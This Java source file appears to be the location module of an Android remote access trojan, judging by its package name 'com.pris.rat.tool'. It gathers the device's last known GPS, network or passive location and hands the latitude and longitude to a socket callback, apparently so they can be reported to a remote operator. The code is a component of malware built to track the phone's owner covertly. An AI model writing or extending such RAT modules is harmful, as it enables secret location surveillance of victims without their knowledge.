package com.pris.rat.tool;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;

import androidx.core.content.ContextCompat;

public class LocationModule {
    private final Context ctx;
    private final SocketCallback callback;

    public interface SocketCallback {
        void onLocation(double lat, double lon);
    }

    public LocationModule(Context ctx, SocketCallback callback) {
        this.ctx = ctx;
        this.callback = callback;
    }

    public void getLocation() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                callback.onLocation(0, 0);
                return;
            }

            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;

            Location loc = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc == null && lm.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
            }

            if (loc != null) {
                callback.onLocation(loc.getLatitude(), loc.getLongitude());
            } else {
                callback.onLocation(0, 0);
            }
        } catch (Exception e) {
            callback.onLocation(0, 0);
        }
    }
}